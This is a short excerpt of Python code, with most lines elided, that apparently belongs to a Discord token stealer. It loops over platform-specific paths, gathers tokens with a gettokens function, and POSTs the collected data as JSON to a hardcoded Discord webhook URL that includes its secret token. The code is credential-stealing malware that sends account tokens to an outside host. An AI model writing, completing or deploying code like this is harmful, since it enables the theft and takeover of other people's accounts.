    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                ...
                urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/webhooks/1498776714631712902/RjaRFHHa-F8uAyRtks5gpRIfNvdMcxpmnuUfvOZV1v9jIye_TprbyOT4-eMFqSnoscfT', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
